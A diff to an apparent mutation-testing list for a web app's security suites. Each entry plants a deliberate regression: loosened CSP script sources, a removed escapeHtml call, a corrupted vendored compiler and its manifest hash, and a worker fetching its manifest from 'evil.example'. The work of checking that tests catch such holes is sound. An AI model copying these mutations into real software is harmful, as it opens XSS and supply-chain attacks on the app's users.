@@ -63,8 +63,13 @@ M=[
  ('factory: PairCreated stops indexing the tokens','contractforge-deploy/app.js',"event PairCreated(address indexed token0, address indexed token1, address pair);","event PairCreated(address token0, address token1, address pair);",'forge'),
  ('slither pin: a changed function no longer breaks its pin','tests/slither-check.mjs',"else if (!pinsOf(entry).includes(f.pin.hash)) {","else if (false) {",'slither-pin.mjs'),
  # ---- phase 5.5: the CSP and the innerHTML escape (detected by the Node suites)
- ('csp: script-src regains unsafe-inline','vercel.json',"script-src 'self' https://cdnjs.cloudflare.com","script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com",'csp.mjs'),
+ ('csp: script-src regains unsafe-inline','vercel.json',"script-src 'self' 'wasm-unsafe-eval'","script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'",'csp.mjs'),
+ ('csp: script-src regains an external host','vercel.json',"script-src 'self' 'wasm-unsafe-eval'","script-src 'self' https://cdn.jsdelivr.net 'wasm-unsafe-eval'",'csp.mjs'),
  ('xss: an approved sink loses escapeHtml (contract bar name)','contractforge-deploy/ui.js',"Current contract</span><b>' + escapeHtml(pendingSource.name)","Current contract</span><b>' + pendingSource.name",'xss.mjs'),
+ # ---- phase 6: the self-hosted compiler supply chain (detected by the Node suites)
+ ('vendor: a byte of the compiler changes','contractforge-deploy/vendor/solc/soljson-v0.8.24+commit.e11b9ed9.js',"var Module = Module || {}","var Module = Module || {}x",'vendor.mjs'),
+ ('vendor: the manifest hash diverges from the file','contractforge-deploy/vendor/MANIFEST.json','"sha256": "fb59b825b7d57f9de89cd9de2415b12aab1fcc7eb2573fd2bf5c9b969eacf4d9"','"sha256": "0000000000000000000000000000000000000000000000000000000000000000"','vendor.mjs'),
+ ('worker: it fetches a remote compiler URL again','contractforge-deploy/solc-worker.js',"fetch('vendor/MANIFEST.json')","fetch('https://evil.example/MANIFEST.json')",'solc-loader.mjs'),
 ]
 if '--self-test' in sys.argv:
     # a harmless edit (a comment) that no test should notice: the run has to report it and exit 1
